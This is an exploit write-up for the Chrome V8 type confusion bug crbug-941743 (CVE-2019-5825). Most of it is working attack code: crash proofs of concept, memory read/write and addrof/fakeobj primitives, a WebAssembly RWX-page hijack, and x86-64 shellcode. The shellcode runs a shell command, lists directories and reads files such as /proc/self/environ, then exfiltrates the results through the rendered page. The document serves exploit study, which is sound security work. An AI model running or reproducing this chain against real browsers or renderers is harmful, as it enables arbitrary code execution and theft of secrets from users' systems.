# crbug-941743

Chrome V8 type confusion [bug](https://crbug.com/941743), assigned CVE-2019-5825

The context for this exploit is a non-sandboxed renderer (otherwise a sandbox escape is also required) that executes user-specified Javascript.  The approach taken involves custom shellcode to support exfiltration using only syscalls and writing its output to user-visible buffer that is later rendered.

## Proof of Concept

The snippet from the Chrome bug

```javascript
var arr = [1]; 
for (var i = 1; i < 30; ++i) {  
    var a2 = arr.map(function(){arr.push(2);}); 
    arr.some(arr.constructor);  
    for (var j = 0; j < 10000; ++j) {} 
}
```

or the snippet from [here](https://github.com/allpaca/V8Harvest/blob/master/V8Harvest_2019.md#regress-crbug-941743js-chromium-issue)

```javascript
Array(2 ** 30);

let a = [1, 2, , , , 3];
function mapping(a) {
  return a.map(v => v);
};
mapping(a);
mapping(a);
%OptimizeFunctionOnNextCall(mapping);
mapping(a);

a.length = 32 * 1024 * 1024 - 1;
a.fill(1, 0);
a.push(2);
a.length += 500;
mapping(a);  
```

will cause a segfault if the Chrome / V8 version under test is vulnerable.

## Exploit primitives

There is a Metasploit module for this issue [here](https://www.rapid7.com/db/modules/exploit/multi/browser/chrome_array_map/) (source [here](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/browser/chrome_array_map.rb)).

Which is based on the exploit by Exodus Intel that can be found [here](https://github.com/exodusintel/Chromium-941743/blob/master/exp.js).

```javascript
// Generate a large array to ensure TurboFan won't inline array constructors
Array(2**30);

// Want the following layout in memory
// <Array.map output> <float array> <typed array> <Object>
//
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/map
```

An object's map (arrays are objects) is a data structure that contains:
- The dynamic type of the object, eg String, Uint8Array, etc
- The size of the object in bytes
- The properties/fields of the object and where they are stored
- (If an array) The type of the array elements, eg unboxed doubles, tagged pointers, etc
- The prototype of the object if any

While the property names are usually stored in the map, the property values are stored in the object itself in one of several possible regions.  The map provides the exact location of the property in the respective region.

Use %DebugPrint(object) to get info about an object's map. %DebugPrint requires launching d8 with --allow-natives-syntax

Ref: https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/ "What is a Map?"

```javascript
// Create a fast, holey smi array
// Fast, holey array refer to the use of arrays internally
// (rather than dictionaries internally for sparse, holey arrays)
// Ref: https://v8.dev/blog/fast-properties
var holey_smi_array = [1, 2, ,,, 3];
var float_array;
var typed_array;
var object;

// Offset of float array length field from the Array.map output
const float_array_length_offset = 23;
// Offset of typed array length field from the Array.map output
const typed_array_length_offset = 24;
// Offset of typed array address pointer from the Array.map output
const typed_array_address_offset = 25;
// Offset of object['b'] from the Array.map output
const object_property_b_offset = 33;

function mapping(array) {
    function callback(_element, index) {
        if (index == 0) {
            float_array = [0.1, 0.2];

            typed_array = new BigUint64Array(2);
            // The n suffix indicates bigint literal 
            typed_array[0] = 0x41414141n;
            typed_array[1] = 0x42424242n;

            object = {'a': 0x31323334, 'b': 1};
            object['b'] = object;
        }

        // Minimize the corruption for stability
        if (index > float_array_length_offset)
            throw 'stop';
        
        return index;
    }

    return array.map(callback);
}

for (let i=0; i<10**5; i++)
    mapping(holey_smi_array);

// Lengthen the array but ensure it points to a array (non-dictionary) store
holey_smi_array.length = (32 * 1024 * 1024) - 1;
holey_smi_array.fill(1, float_array_length_offset, float_array_length_offset + 1);
holey_smi_array.fill(1, float_array_length_offset + 2);
holey_smi_array.push(2);
holey_smi_array.length += 500;

// The elements of holey_smi_array are now:
// (can verify with %DebugPrint with debug d8)
//
//                   0: 1
//                   1: 2
//                 2-4: <hole>
//                   5: 3
//                6-22: <hole>
//                  23: 1
//                  24: <hole>
//         25-33554430: 1
//            33554431: 2
//   33554432-33554931: <hole>

// Exception caused by the throw within the mapping callback
try { mapping(holey_smi_array); } catch (e) { }

// TODO Show the corruption of float_array, typed_array and object.
//      Need to first review writeups/docs defining object/array memory layout.
//      Use gdb and/or addrof/read (defined below) to determine specifics.
```

From the language spec., numbers in Javascript are represented as eight-byte IEEE 754 doubles.
 
However 32-bit signed integers are represented as `value << 32` and are called smis (small immediates).

(Tagged) Pointers are represented as word-aligned 64-bit values.  The least-significant bit is set to one for tagged pointers to distinguish them from smis (which would otherwise always be zero due to pointers always being word-aligned).

Note that pointer compression was added in V8 8.0 and is not applicable here.

Ref: https://v8.dev/blog/pointer-compression and https://v8.dev/blog/v8-release-80

```javascript
var view = new DataView(new ArrayBuffer(8));

Number.prototype.f2i = function() {
    view.setFloat64(0, this);
    return view.getBigUint64(0);
};

Number.prototype.i2f = function() {
    view.setBigUint64(0, BigInt(this));
    return view.getFloat64();
};

BigInt.prototype.i2f = function() {
    view.setBigUint64(0, this);
    return view.getFloat64();
};
 
var output = function(...args) {
    let s = '';
    for (const arg of args)
        s += arg + ' ';
    document.write(s + '<br/>');
};

if (
  float_array.length == 2 ||
  float_array[typed_array_length_offset + 3].f2i() != 0x41414141 ||
  float_array[typed_array_length_offset + 4].f2i() != 0x42424242 ||
  float_array[typed_array_length_offset + 8].f2i() != 0x3132333400000000n
) {
    output('float_array corruption failed');
}

// TODO Both read and write require offsetting the address by -0x1f
//      Investigate and document why this is necessary.
//      The fakeobj primitive does not seem to require this.

function read(addr) {
    let orig_addr = float_array[typed_array_address_offset];
    float_array[typed_array_address_offset] = (addr - 0x1fn).i2f();
    let retval = typed_array[0];
    float_array[typed_array_address_offset] = orig_addr;
    return retval;
}

function write(addr, val) {
    let orig_addr = float_array[typed_array_address_offset];
    float_array[typed_array_address_offset] = (addr - 0x1fn).i2f();
    typed_array[0] = val;
    float_array[typed_array_address_offset] = orig_addr;
}

function addrof(obj) {
    object['b'] = obj;
    return float_array[object_property_b_offset].f2i();
}

function fakeobj(addr) {
    float_array[object_property_b_offset] = addr.i2f();
    return object['b'];
}
```

## WebAssembly RWX page

Create WebAssembly code, which creates RWX pages in memory, then overwrite with arbitrary shellcode and redirect control to it.
 
The WebAssembly code used doesn't matter since it will be overwritten.  Go to https://wasdk.github.io/WasmFiddle/ then click Build and Code Buffer, the default code that returns 42 is sufficient.

Ref: https://www.madstacks.dev/posts/V8-Exploitation-Series-Part-6/

```javascript
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);
var wasm_func = wasm_instance.exports.main;

var wasm_instance_addr = addrof(wasm_instance);
output('wasm_instance_addr', wasm_instance_addr.toString(16));
```

Determining the RWX page address can be a challenge as it varies significantly between versions of Chrome / V8.  The following process was used:

```sh
cat <<EOF >tmp.js
  var wasm_code = new Uint8Array([<wasm code above>]);
  var wasm_module = new WebAssembly.Module(wasm_code);
  var wasm_instance = new WebAssembly.Instance(wasm_module);
  %DebugPrint(wasm_instance);
  while (1) {};
EOF

$ gdb-pwndbg d8/v8/out.gn/x64.release/d8
pwndbg> run --allow-natives-syntax tmp.js
<wasm_instance address> <Instance map = <wasm_instance map address>>
^C
pwndbg> vmmap -wx
<rwx page address>
pwndbg> search -t pointer <rwx page address>
...
; Search backwards from the wasm_instance using address search results.
; There is a possibility multiple levels of pointers will be need to be followed.
pwndbg> x/64gx <wasm_instance address> - 1
...
```

```javascript
//%DebugPrint(wasm_func);
//output(wasm_func.constructor.name, typeof wasm_func); // Expected: Function function
var wasm_func_addr = addrof(wasm_func);
output('wasm_func_addr', wasm_func_addr.toString(16));

// SharedFunctionInfo
var sfi_addr = read(wasm_func_addr - 1n + 3n*8n);
output('sfi_addr', sfi_addr.toString(16));
//%DebugPrint(fakeobj(sfi_addr));
//output(typeof fakeobj(sfi_addr)); // Expected: symbol

// Code JS_TO_WASM_FUNCTION
var exported_func_data_addr = read(sfi_addr - 1n + 1n*8n);
output('exported_func_data_addr', exported_func_data_addr.toString(16));
//%DebugPrint(fakeobj(exported_func_data_addr));
//output(typeof fakeobj(exported_func_data_addr)); // Expected: symbol

var rwx_page_addr = read(exported_func_data_addr + 85n);
output('rwx_page_addr', rwx_page_addr.toString(16));
```

## Shellcode

The shellcode used requires a buffer for input and output.

```javascript
// Input / output buffer to be used within the shellcode
var buffer = new ArrayBuffer(4096);
var backing_store_addr = read(addrof(buffer) - 1n + 4n*8n);
output('backing_store_addr', backing_store_addr.toString(16));
// Offsets may vary with different versions of v8, validate with:
// new DataView(buffer).setBigUint64(0, 0x4141414141414141n);
// output(read(backing_store_addr + 0n*8n).toString(16));
```

At this point it is only a matter of writing and deploying shellcode, for example:

```
// Launch execve("/bin/sh", {"-c", "/usr/bin/xcalc"}, {"DISPLAY=:0"})
var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98, 96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98, 105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1, 72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90, 72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98, 96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98, 105, 110, 80, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5, 144, 144, 144, 90, 90, 90, 90];

var buffer_addr_offsets = [];

for (offset of buffer_addr_offsets) {
    for (let i=0n; i<8n; i++)
        shellcode[offset+i] = (backing_store_addr >> (i*8n)) & 0x0ffn;
}

while (shellcode.length % 8 != 0)
    shellcode.push(0x90);

for (let i=0n; i<shellcode.length; i+=8n) {
    let x = 0n;
    for (let j=0n; j<8n; j++)
        x |= BigInt(shellcode[i+j]) << (j*8n);

    write(rwx_page_addr + i, x);
}

wasm_func();
```

## Exfiltration

An example using the getcwd syscall:

```asm
; getcwd(buf, size)
mov rax, 79      ; b8 4f 00 00 00
mov rdi, buf     ; 48 bf <00 00 00 00 00 00 00 00>
mov rsi, size    ; be 00 04 00 00
syscall          ; 0f 05
ret              ; c3
```

```javascript
var shellcode = [0xb8, 0x4f, 0x00, 0x00, 0x00, 0x48, 0xbf, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0xbe, 0x00, 0x04, 0x00, 0x00, 0x0f, 0x05, 0xc3];

var buffer_addr_offsets = [7n];

// shellcode write code ommitted

var buffer_string = '';
for (let i=0n; i<buffer.byteLength; i+=8n) {
    let x = read(backing_store_addr + i);

    let stop = false;
    for (let j=0n; j<8n; j++) {
        let y = Number((x >> (j*8n)) & 0x0ffn);
        buffer_string += String.fromCharCode(y);

        if (y == 0) {
            stop = true;
            break;
        }
    }
    if (stop)
        break;
}
output(buffer_string);
```

A more sophisticated example for getdents:

```c
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>

struct linux_dirent {
    long           d_ino;
    off_t          d_off;
    unsigned short d_reclen;
    char           d_name[];
};

int main() {
    char buf[1024];

    int fd = open(".", O_RDONLY | O_DIRECTORY);
    if (fd == -1) {
        perror("open");
        return 1;
    }

    /* Normally would loop until getdents returns zero */

    int rv = syscall(SYS_getdents, fd, buf, sizeof(buf));
    if (rv == -1) {
        perror("getdents");
        close(fd);
        return 1;
    }

    for (int i=0; i<rv; ) {
        struct linux_dirent *d = (struct linux_dirent *) (buf + i);
        printf("%s\n", d->d_name);
        i += d->d_reclen;
    }

    rv = syscall(SYS_getdents, fd, buf, sizeof(buf));
    if (rv > 0)
        printf("<more>\n");

    close(fd);
}
```

```asm
        global _start

        section .text
_start:
        ; r0  r1  r2  r3  r4  r5  r6  r7  r8 r9 r10 r11 r12 r13 r14 r15
        ; rax rcx rdx rbx rsp rbp rsi rdi 

        ; Call argument registers: rdi, rsi, rdx, rcx, r8, r9
        ; Callee-saved registers: rbx, rsp, rbp, r12, r13, r14, r15
        ; Ref: https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI
        ;      https://stackoverflow.com/a/18024743

        ; rbx => input path and output buffer
        ;        output buffer + size / 2 => getdents buffer
        ; r12 => file descriptor

        push rbx                  ; 53
        push r12                  ; 41 54
        push r13                  ; 41 55

        mov rbx, <buf>            ; 48 bb <00 00 00 00 00 00 00 00>

        ; open(<path>, O_RDONLY | O_DIRECTORY, 0)
        mov rax, 2                ; b8 02 00 00 00
        mov rdi, <path>           ; 48 bf <00 00 00 00 00 00 00 00>
        mov rsi, 0x10000          ; be 00 00 01 00
        mov rdx, 0                ; ba 00 00 00 00
        syscall                   ; 0f 05

        cmp rax, -1               ; 48 83 f8 ff
        je abort                  ; 0f 84 d4 00 00 00
        mov r12, rax              ; 49 89 c4

        ; getdents(fd, buf, sizeof(buf))
        mov rax, 78               ; b8 4e 00 00 00
        mov rdi, r12              ; 4c 89 e7
        mov rsi, rbx              ; 48 89 de
        add rsi, size / 2         ; 48 81 c6 00 08 00 00
        mov rdx, size / 2         ; ba 00 08 00 00
        syscall                   ; 0f 05

        ; rcx => pointer to end of getdents buffer data
        ; r8 => getdents buffer read pointer
        ; r9 => output buffer write pointer

        cmp rax, 0                ; 48 83 f8 00
        jle abort                 ; 0f 8e ae 00 00 00 
        mov rcx, rbx              ; 48 89 d9
        add rcx, size / 2         ; 48 81 c1 00 08 00 00
        add rcx, rax              ; 48 01 c1
        mov r8, rbx               ; 49 89 d8
        add r8, size / 2          ; 49 81 c0 00 08 00 00
        mov r9, rbx               ; 49 89 d9

        ; r10 => record start pointer
        ; r11 => length of record
        ; r13 => scratch

getdents_loop:
        cmp r8, rcx               ; 49 39 c8
        jge getdents_done         ; 7d 38

        mov r10, r8               ; 4d 89 c2

        add r8, 16                ; 49 83 c0 10
        mov r11, 0                ; 41 bb 00 00 00 00
        mov r11w, [r8]            ; 66 45 8b 18
        add r8, 2                 ; 49 83 c0 02

strcpy:
        cmp byte [r8], 0          ; 41 80 38 00
        je getdents_next          ; 74 0e

        ; It will be impossible for the output buffer to overflow.
        ; The input buffer will always have more data, hence not checking.

        mov byte r13b, [r8]       ; 45 8a 28
        mov byte [r9], r13b       ; 45 88 29
        inc r8                    ; 49 ff c0
        inc r9                    ; 49 ff c1
        jmp strcpy                ; eb ec

getdents_next:
        ; Add a newline delimiter
        mov byte [r9], 0x0a       ; 41 c6 01 0a
        inc r9                    ; 49 ff c1

        mov r8, r10               ; 4d 89 d0
        add r8, r11               ; 4d 01 d8
        jmp getdents_loop         ; eb c3

getdents_done:
        ; Check for more (ie buffer insufficient)
        ; getdents(fd, buf, sizeof(buf))
        mov rax, 78               ; b8 4e 00 00 00
        mov rdi, r12              ; 4c 89 e7 
        mov rsi, rbx              ; 48 89 de
        add rsi, size / 2         ; 48 81 c6 00 08 00 00
        mov rdx, size / 2         ; ba 00 08 00 00
        syscall                   ; 0f 05

        cmp rax, 0                ; 48 83 f8 00
        jle done                  ; 7e 31

        mov byte [r9], 0x3c ; <     41 c6 01 3c
        inc r9                    ; 49 ff c1
        mov byte [r9], 0x6d ; m     41 c6 01 6d
        inc r9                    ; 49 ff c1
        mov byte [r9], 0x6f ; o     41 c6 01 6f
        inc r9                    ; 49 ff c1
        mov byte [r9], 0x72 ; r     41 c6 01 72
        inc r9                    ; 49 ff c1
        mov byte [r9], 0x65 ; e     41 c6 01 65
        inc r9                    ; 49 ff c1
        mov byte [r9], 0x3e ; >     41 c6 01 3e
        inc r9                    ; 49 ff c1
        mov byte [r9], 0x0a ; \n    41 c6 01 0a
        inc r9                    ; 49 ff c1

done:
        mov byte [r9], 0          ; 41 c6 01 00
        inc r9                    ; 49 ff c1

        ; TODO Should close the file descriptor

        pop r13                   ; 41 5d
        pop r12                   ; 41 5c
        pop rbx                   ; 5b

abort:
        ret                       ; c3

        section .data
size    equ 4096
buf:    resb size
```

```javascript
    var shellcode = [0x53, 0x41, 0x54, 0x41, 0x55, 0x48, 0xbb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x48, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xbe, 0x00, 0x00, 0x01, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x83, 0xf8, 0xff, 0x0f, 0x84, 0xd4, 0x00, 0x00, 0x00, 0x49, 0x89, 0xc4, 0xb8, 0x4e, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xe7, 0x48, 0x89, 0xde, 0x48, 0x81, 0xc6, 0x00, 0x08, 0x00, 0x00, 0xba, 0x00, 0x08, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x83, 0xf8, 0x00, 0x0f, 0x8e, 0xae, 0x00, 0x00, 0x00, 0x48, 0x89, 0xd9, 0x48, 0x81, 0xc1, 0x00, 0x08, 0x00, 0x00, 0x48, 0x01, 0xc1, 0x49, 0x89, 0xd8, 0x49, 0x81, 0xc0, 0x00, 0x08, 0x00, 0x00, 0x49, 0x89, 0xd9, 0x49, 0x39, 0xc8, 0x7d, 0x38, 0x4d, 0x89, 0xc2, 0x49, 0x83, 0xc0, 0x10, 0x41, 0xbb, 0x00, 0x00, 0x00, 0x00, 0x66, 0x45, 0x8b, 0x18, 0x49, 0x83, 0xc0, 0x02, 0x41, 0x80, 0x38, 0x00, 0x74, 0x0e, 0x45, 0x8a, 0x28, 0x45, 0x88, 0x29, 0x49, 0xff, 0xc0, 0x49, 0xff, 0xc1, 0xeb, 0xec, 0x41, 0xc6, 0x01, 0x0a, 0x49, 0xff, 0xc1, 0x4d, 0x89, 0xd0, 0x4d, 0x01, 0xd8, 0xeb, 0xc3, 0xb8, 0x4e, 0x00, 0x00, 0x00, 0x4c, 0x89, 0xe7, 0x48, 0x89, 0xde, 0x48, 0x81, 0xc6, 0x00, 0x08, 0x00, 0x00, 0xba, 0x00, 0x08, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x83, 0xf8, 0x00, 0x7e, 0x31, 0x41, 0xc6, 0x01, 0x3c, 0x49, 0xff, 0xc1, 0x41, 0xc6, 0x01, 0x6d, 0x49, 0xff, 0xc1, 0x41, 0xc6, 0x01, 0x6f, 0x49, 0xff, 0xc1, 0x41, 0xc6, 0x01, 0x72, 0x49, 0xff, 0xc1, 0x41, 0xc6, 0x01, 0x65, 0x49, 0xff, 0xc1, 0x41, 0xc6, 0x01, 0x3e, 0x49, 0xff, 0xc1, 0x41, 0xc6, 0x01, 0x0a, 0x49, 0xff, 0xc1, 0x41, 0xc6, 0x01, 0x00, 0x49, 0xff, 0xc1, 0x41, 0x5d, 0x41, 0x5c, 0x5b, 0xc3];

var buffer_addr_offsets = [7n, 22n];

// Helper function to convert path strings
//
// def convert(path):
//     b = [ord(c) for c in path + '\x00']
//     if len(b) % 8 != 0:
//         b += (8 - (len(b)%8)) * [0]
//
//     for i in range(0, len(b), 8):
//         w = 0
//         for j in range(8):
//             w |= b[i+j] << (8*j)
//
//         print(f'{w:016x}')

// . (cwd)
write(backing_store_addr, 0x000000000000002en);

// / (root dir)
//write(backing_store_addr, 0x000000000000002fn);

// /proc/self
//write(backing_store_addr,      0x65732f636f72702fn);
//write(backing_store_addr + 8n, 0x000000000000666cn);

// shellcode write and output code ommitted
```

And finally an example to support reading files:

```asm
        global _start

        section .text
_start:
        ; r0  r1  r2  r3  r4  r5  r6  r7  r8 r9 r10 r11 r12 r13 r14 r15
        ; rax rcx rdx rbx rsp rbp rsi rdi 

        ; call argument registers: rdi, rsi, rdx, rcx, r8, r9
        ; callee-saved registers: rbx, rsp, rbp, r12, r13, r14, r15
        ; Ref: https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI
        ;      https://stackoverflow.com/a/18024743

        ; rbx => input path and output buffer

        push rbx              ; 53

        mov rbx, <buf>        ; 48 bb <00 00 00 00 00 00 00 00>

        ; open(<path>, O_RDONLY, 0)
        mov rax, 2            ; b8 02 00 00 00 
        mov rdi, <path>       ; 48 bf <00 00 00 00 00 00 00 00>
        mov rsi, 0            ; be 00 00 00 00
        mov rdx, 0            ; ba 00 00 00 00
        syscall               ; 0f 05

        cmp rax, -1           ; 48 83 f8 ff
        jle abort             ; 7e 33

        ; read(fd, buf, sizeof(buf))
        mov rdi, rax          ; 48 89 c7
        mov rax, 0            ; b8 00 00 00 00
        mov rsi, rbx          ; 48 89 de
        mov rdx, size         ; ba 00 10 00 00
        syscall               ; 0f 05

        cmp rax, -1           ; 48 83 f8 ff
        jle abort             ; 7e 1b

        ; Add trailing null byte
        mov rcx, rbx          ; 48 89 d9
        add rcx, rax          ; 48 01 c1
        mov byte [rcx], 0     ; c6 01 00

        ; TODO Should close the file descriptor

abort:
        pop rbx               ; 5b

        ret                   ; c3

        section .data
size    equ 4096
buf:    resb size
```

```javascript
var shellcode = [0x53, 0x48, 0xbb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb8, 0x02, 0x00, 0x00, 0x00, 0x48, 0xbf, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xbe, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x83, 0xf8, 0xff, 0x7e, 0x33, 0x48, 0x89, 0xc7, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xde, 0xba, 0x00, 0x10, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x83, 0xf8, 0xff, 0x7e, 0x1b, 0x48, 0x89, 0xd9, 0x48, 0x01, 0xc1, 0xc6, 0x01, 0x00, 0x5b, 0xc3];

var buffer_addr_offsets = [3n, 18n];

// /start.sh
//write(backing_store_addr,      0x732e74726174732fn);
//write(backing_store_addr + 8n, 0x0000000000000068n);

// /proc/self/environ
write(backing_store_addr,       0x65732f636f72702fn);
write(backing_store_addr + 8n,  0x7269766e652f666cn);
write(backing_store_addr + 16n, 0x0000000000006e6fn);

// /proc/self/cmdline
//write(backing_store_addr,       0x65732f636f72702fn);
//write(backing_store_addr + 8n,  0x696c646d632f666cn);
//write(backing_store_addr + 16n, 0x000000000000656en);

// shellcode write and output code ommitted
```
